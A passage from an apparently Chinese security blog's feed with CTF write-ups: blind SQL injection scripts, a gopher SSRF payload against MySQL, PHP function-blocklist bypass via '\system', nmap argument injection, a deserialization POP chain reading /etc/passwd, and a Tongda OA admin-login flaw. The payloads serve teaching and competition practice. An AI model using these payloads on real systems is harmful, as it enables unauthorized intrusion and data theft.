class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        response = session.post(<span class="string">"http://119.61.19.212:58888/index.php"</span>, data=paramsPost, headers=headers).text</div><div class="line">        <span class="keyword">if</span> <span class="string">"52"</span> <span class="keyword">in</span> response:</div><div class="line">            <span class="keyword">print</span> paramsPost</div><div class="line">            flag+=i</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag1+=i</div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">                flag1=flag1.replace(i,<span class="string">"_"</span>)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200705/vNbmlDsrSLgL.png?imageslim" alt="mark"></p><p><code>flag{d7ee68cb5251585d83e0b8cdb2aa06ef}</code></p><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>考察ssrf+mysql的利用，通过dict协议探测到3306端口，mysql用户名root、密码是空密码，直接gopher协议打就行，可以使用<code>gopherus.py</code>直接生成payload</p><p><img src="http://pic.c1imber.top/blog/20200705/XLn0M5hiqMA3.png?imageslim" alt="mark"></p><p>需要对payload进行二次url编码，最终payload如下</p><p><code>gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2518%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2573%2573%2572%2566%252e%2566%256c%2561%2567%2501%2500%2500%2500%2501</code></p><p><img src="http://pic.c1imber.top/blog/20200705/IY43I2QbguNd.png?imageslim" alt="mark"></p><h3 id="easy-xxe"><a href="#easy-xxe" class="headerlink" title="easy_xxe"></a>easy_xxe</h3><p>可以读取到<code>/etc/passwd</code>文件，但是找不到flag位置，比赛结束也没做出来，等writeup学习吧，哭</p><h3 id="2020-7-9补充"><a href="#2020-7-9补充" class="headerlink" title="2020.7.9补充"></a>2020.7.9补充</h3><p>看了其他师傅们easy_sql这道题的writeup，发现可以直接从index.php.bak当中获取源码从而得到过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(preg_match(&quot;/\d.+?\D.+/is&quot;,$id)</div></pre></td></tr></table></figure><p>所以非常好绕，给出两个从其他师傅博客看到的writeup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ord(&apos;a&apos;)-ord(&apos;b&apos;) union select group_ concat(flag) from bankdb.flag</div><div class="line"></div><div class="line">now() union select group_ concat(flag) from bankdb.flag</div></pre></td></tr></table></figure><p>当时写这道题时自己绝对是脑抽了，，，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧&lt;/p&gt;
&lt;h3 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; cl
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯朱雀组-部分web</title>
    <link href="https://c1aysec.github.io/2020/05/17/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%83%A8%E5%88%86web/"/>
    <id>https://c1aysec.github.io/2020/05/17/2020网鼎杯朱雀组-部分web/</id>
    <published>2020-05-17T05:42:35.134Z</published>
    <updated>2020-08-23T15:53:02.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下</p><p><img src="http://pic.c1imber.top/blog/20200517/bsyihTlgKeKg.png?imageslim" alt="mark"></p><p>通过提交的内容很容易想到了php代码执行，但是经过简单测试发现好像过滤了很多函数，那么首先尝试读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=file_get_contents&amp;p=index.php</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/nQVCr7AUvwMu.png?imageslim" alt="mark"></p><p>获取到源码如下，很容易看到代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</div><div class="line">    $result = call_user_func($func, $p);</div><div class="line">    $a= gettype($result);</div><div class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</div><div class="line">        <span class="keyword">return</span> $result;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</div><div class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</div><div class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$func = $_REQUEST[<span class="string">"func"</span>];</div><div class="line">$p = $_REQUEST[<span class="string">"p"</span>];    </div><div class="line"></div><div class="line"><span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</div><div class="line">    $func = strtolower($func);</div><div class="line">    <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</div><div class="line">        <span class="keyword">echo</span> gettime($func, $p);</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>发现在代码层设置了<code>disable_function</code>，里面过滤了很多函数，而且要求执行结果返回的类型为字符串才能输出，这里很容易能想到之前做过的P牛星球的<code>Code-Breaking Puzzles挑战</code>,通过php命名空间进行绕过,原理方面，直接贴出之前的笔记,当然，前提要求是php7<br><img src="http://pic.c1imber.top/blog/20200517/lJWxnT4Jbfur.png?imageslim" alt="mark"></p><p>所以这里可以使用<code>\system</code>直接绕过，获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=find / -name *flag*</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/5e34cxGbtmVW.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=\system&amp;p=cat /tmp/flag_c6bf23b35ba2</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/AK1W7XjoMXks.png?imageslim" alt="mark"></p><p><code>\phpinfo</code>查看环境，发现就是php7,所以这样就能直接秒了，不知道有没有其它解法==<br><img src="http://pic.c1imber.top/blog/20200517/xdSxJ7zuWg4S.png?imageslim" alt="mark"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>应该是考察nmap的命令？？？<br>题目已经告诉flag在根目录了，直接输入<code>127.0.0.1&#39; -iL /flag -oN /var/www/html/aaa.txt 127.0.0.1</code>，读取<code>/flag</code>写入网站根目录，访问就能获取flag了<br><img src="http://pic.c1imber.top/blog/20200517/7strEvtiNk3u.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200517/JFMpgY8B1hjB.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;phpweb&quot;&gt;&lt;a href=&quot;#phpweb&quot; class=&quot;headerlink&quot; title=&quot;phpweb&quot;&gt;&lt;/a&gt;phpweb&lt;/h3&gt;&lt;p&gt;打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组-php反序列化</title>
    <link href="https://c1aysec.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/</id>
    <published>2020-05-10T08:51:05.550Z</published>
    <updated>2020-05-11T08:08:41.286Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2020网鼎杯青龙组-php反序列化"><a href="#2020网鼎杯青龙组-php反序列化" class="headerlink" title="2020网鼎杯青龙组-php反序列化"></a>2020网鼎杯青龙组-php反序列化</h3><p>赛后拿到了题目的源码，搭到本地做了一遍，今天不比赛，先试试题目难度~</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op;</div><div class="line">    <span class="keyword">protected</span> $filename;</div><div class="line">    <span class="keyword">protected</span> $content;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        $op = <span class="string">"1"</span>;</div><div class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</div><div class="line">        $content = <span class="string">"Hello World!"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();   </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;write();       </div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</div><div class="line">            $res = <span class="keyword">$this</span>-&gt;read();</div><div class="line">            <span class="keyword">$this</span>-&gt;output($res);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="keyword">$this</span>-&gt;content;</div><div class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</div><div class="line">                <span class="keyword">die</span>();</div><div class="line">            &#125;</div><div class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</div><div class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</div><div class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</div><div class="line">        $res = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</div><div class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $res;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> $s;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</div><div class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;process();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</div><div class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</div><div class="line"></div><div class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</div><div class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</div><div class="line">        $obj = unserialize($str);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>大致过了遍代码，看到这里存在php反序列化,有两条利用链，分别对应文件的读和写操作，具体分析如下：</p><p>首先传入序列化字符串str，反序列化时触发FileHandler类的<code>__destruct</code>方法，这里会对<code>$this-&gt;op</code>的值进行判断，当<code>$this-&gt;op===&quot;2&quot;</code>，会将<code>$this-&gt;op</code>重新赋值为<code>&quot;1&quot;</code>,并将<code>$this-&gt;content</code>赋为空字符串；之后进入<code>process</code>方法，当<code>$this-&gt;op==&quot;1&quot;</code>时，进入<code>write</code>方法，但是由于这里<code>$this-&gt;content</code>的值被赋为了空字符串，所以不能向文件写入任何可控内容，导致“写”这一条利用链不能利用，所以要想办法绕过<code>__destruct</code>当中的判断，进行读文件的利用。</p><p>这里可以将<code>$this-&gt;op</code>的值设置为整型数字2进行绕过，因为在<code>__destruct</code>当中使用<code>===</code>进行了强比较，所以<code>2===&quot;2&quot;</code>结果为False，而在<code>process</code>方法中，使用了<code>==</code>进行比较，由于php弱类型，<code>2==&quot;2&quot;</code>结果为True，进入read函数</p><p>pop链构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到payload：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>直接将上述字符传入str并不能读取成功，这是因为序列化字符串当中protected属性的影响，三种属性对应的序列化字符串格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">private:数据类型:属性名长度:&quot;\00类名\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">protected:数据类型:属性名长度:&quot;\00*\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div><div class="line">public:数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;</div></pre></td></tr></table></figure><p>所以这里的payload实际上为：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;00*00op&quot;;i:2;s:11:&quot;00*00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S</p><p><code>\00</code>三个字符均符合<code>!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)</code>，所以这里读取成功<br><img src="http://pic.c1imber.top/blog/20200510/71LKiCfOBTXL.png?imageslim" alt="mark"></p><p>然后就可以通过任意文件读取获得flag了</p><p>5月11日补充：</p><p>题目环境buuoj上已经有了，今天看了颖奇L’Amore师傅的博客，对于这道题在这里需要补充几点</p><p>文章链接：<a href="https://www.gem-love.com/websecurity/2322.html?from=timeline&amp;isappinstalled=0" title="第二届“网鼎杯”青龙组WEB部分题目Writeup" target="_blank" rel="external">第二届“网鼎杯”青龙组WEB部分题目Writeup</a></p><p>文章里提到php7.1+版本对属性类型不敏感，所以在构造poc时直接将对象属性类型设为public也能绕过<code>is_valid</code>的检查，导致非预期解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/Dr6rhw6oKEEs.png?imageslim" alt="mark"></p><p>另外需要注意的是，这里如果使用相对路径的话有可能会失败，原因在文章里也说了，在执行完序列化字符串后，如果没有出现异常就会穿越到根目录，导致读取不到flag.php，在本地环境<code>var_dump</code>一下<code>scandir(&quot;.&quot;)</code>和<code>$res</code>可以看到反序列化后跳到了根目录，获取<code>/flag.php</code>为<code>false</code>（本地php版本：7.0.33）</p><p>payload：<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/kVLhM0tKsVHn.png?imageslim" alt="mark"></p><p>当使用相对路径读取失败时，可以尝试使用以下几种解法：</p><p>方法一：使用绝对路径，需要获取网站根目录，可以从apache配置文件当中获取跟目录，默认配置下，可以从<code>/etc/apache2/sites-available/000-default.conf</code>当中获取网站根目录</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:45:&quot;/etc/apache2/sites-available/000-default.conf&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/XSHqAV3BijwP.png?imageslim" alt="mark"></p><p>可以看到buuoj上这道题的环境没有修改根目录,所以直接读取<code>/var/www/html/flag.php</code>即可</p><p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}</code></p><p><img src="http://pic.c1imber.top/blog/20200511/7CAAH2Oy1nvE.png?imageslim" alt="mark"></p><p>而在比赛环境当中是修改了网站的根目录的，而且apache网站配置文件也不是上面说的那个，需要通过<code>/proc/self/cmdline</code>才能获取到网站的根目录</p><p>方法二：在反序列化字符串时触发异常，这样就不会跳转到根目录了</p><p>当序列化字符串当中属性个数大于实际个数时，就会触发异常，所以把payload修改为<code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code>即可<br><img src="http://pic.c1imber.top/blog/20200511/M0Uz9TRM2iPU.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20200511/eLaLY63pbFgg.png?imageslim" alt="mark"></p><p>另外，有一个奇怪的问题，经过测试发现，buuoj的题目环境通过相对路径就可以读取到flag.php，自己的docker环境也是这样（php版本:7.0.33），有点奇怪，不清楚是什么因素决定的，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;a href=&quot;#2020网鼎杯青龙组-php反序列化&quot; class=&quot;headerlink&quot; title=&quot;2020网鼎杯青龙组-php反序列化&quot;&gt;&lt;/a&gt;2020网鼎杯青龙组-php反序列化&lt;/h3&gt;&lt;p&gt;赛后拿到了题
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录</title>
    <link href="https://c1aysec.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2020/04/22/通达OA任意用户登录/</id>
    <published>2020-04-22T08:46:58.116Z</published>
    <updated>2020-04-24T09:40:29.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析文章：<a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" title="安恒信息应急响应中心" target="_blank" rel="external">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p><p>本地测试版本：2017、v11.3,这两个版本，奇怪的是，在这两个版本的源码当中，都没有找到分析文章当中对<code>CODE_LOGIN.$CODEUID</code>进行判断的那块代码</p><p><img src="http://pic.c1imber.top/blog/20200422/KAn7dkt3wP2e.png?imageslim" alt="mark"></p><p>漏洞位置：</p><p>logincheck_code.php<br><img src="http://pic.c1imber.top/blog/20200422/rwElnHfsQSR6.png?imageslim" alt="mark"></p><p>这里<code>$UID</code>可控，当<code>$_POST[&#39;UID&#39;]</code>为1时，会直接从数据库USER表查询查询系统管理员的信息，然后直接将结果直接赋值给<code>$_SESSION</code>变量，获取系统管理员登录权限（缺少对<code>CODE_LOGIN.$CODEUID</code>的判断,导致直接POST传入UID=1即可获取系统管理员登录权限）</p><p><img src="http://pic.c1imber.top/blog/20200422/Si49nYzoD0Wy.png?imageslim" alt="mark"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div 